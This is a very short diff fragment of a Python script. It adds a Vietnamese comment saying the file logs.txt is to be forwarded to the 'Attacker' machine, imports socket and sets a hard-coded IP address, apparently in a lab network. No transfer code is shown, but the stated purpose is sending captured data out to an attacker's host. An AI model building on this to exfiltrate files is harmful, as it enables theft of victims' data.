@@ -1,3 +1,5 @@
+#Chuyển tiếp file logs.txt đến máy Attacker.
+
 import socket
 
 IP = "192.168.255.132"
